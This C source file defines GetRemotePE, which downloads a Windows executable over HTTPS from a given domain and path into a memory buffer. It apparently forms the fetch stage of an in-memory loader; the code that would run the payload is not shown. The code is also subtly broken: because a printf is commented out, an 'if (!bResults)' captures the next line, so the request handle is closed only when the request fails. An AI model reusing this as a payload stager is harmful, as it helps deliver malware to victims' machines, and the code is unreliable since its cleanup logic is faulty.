#include "headers.h"



DATA GetRemotePE(LPCWSTR domain, LPCWSTR path) {
    
    DATA data = { 0 };

    unsigned char* PEbuf = NULL;
    DWORD totalSize = 0;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    char* pszOutBuffer;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults) {
        do {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                //printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // Allocate space for the buffer.
            pszOutBuffer = (char*)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                //printf("Out of memory\n");
                break;
            }

            // Read the data.
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                //printf("Error %u in WinHttpReadData.\n", GetLastError());
                free(pszOutBuffer);
                break;
            }

            // Reallocate buffer to append new data.
            unsigned char* tempBuf = (unsigned char*)realloc(PEbuf, totalSize + dwDownloaded);
            if (!tempBuf) {
                //printf("Out of memory during reallocation\n");
                free(pszOutBuffer);
                free(PEbuf);
                PEbuf = NULL;
                break;
            }
            PEbuf = tempBuf;

            // Copy new data to the buffer.
            memcpy(PEbuf + totalSize, pszOutBuffer, dwDownloaded);
            totalSize += dwDownloaded;

            // Free the memory allocated to the buffer.
            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    // If nothing was downloaded, free any allocated memory.
    if (totalSize == 0) {
        free(PEbuf);
        PEbuf = NULL;
        //printf("Failed in retrieving the PE\n");
    }

    // Report any errors.
    if (!bResults)
        //printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    data.data = PEbuf;
    data.len = totalSize;

    return data;
}
